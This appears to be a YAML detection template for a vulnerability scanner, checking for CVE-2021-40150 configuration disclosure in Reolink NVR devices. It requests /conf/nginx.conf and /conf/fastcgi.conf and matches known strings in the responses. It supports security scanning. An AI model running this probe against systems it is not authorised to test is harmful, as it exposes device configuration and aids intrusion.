name: poc-yaml-reolink-nvr-configuration-disclosure-cve-2021-40150
binding: 0fc6ec55-763c-454c-acaa-9277d5590272
manual: true
detail:
    author: xiaobacai
    links:
        - https://sploitus.com/exploit?id=PACKETSTORM:167408&utm_source=rss&utm_medium=rss
    vulnerability:
        id: CT-442249
        level: high
    version: <3.0.0.716
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /conf/nginx.conf
        expression: response.body.bcontains(b"nginx.pid") && response.body.bcontains(b"worker_connections")
    r1:
        request:
            cache: true
            method: GET
            path: /conf/fastcgi.conf
        expression: response.body.bcontains(b"fastcgi_param") && response.body.bcontains(b"REDIRECT_STATUS")
expression: r0() || r1()
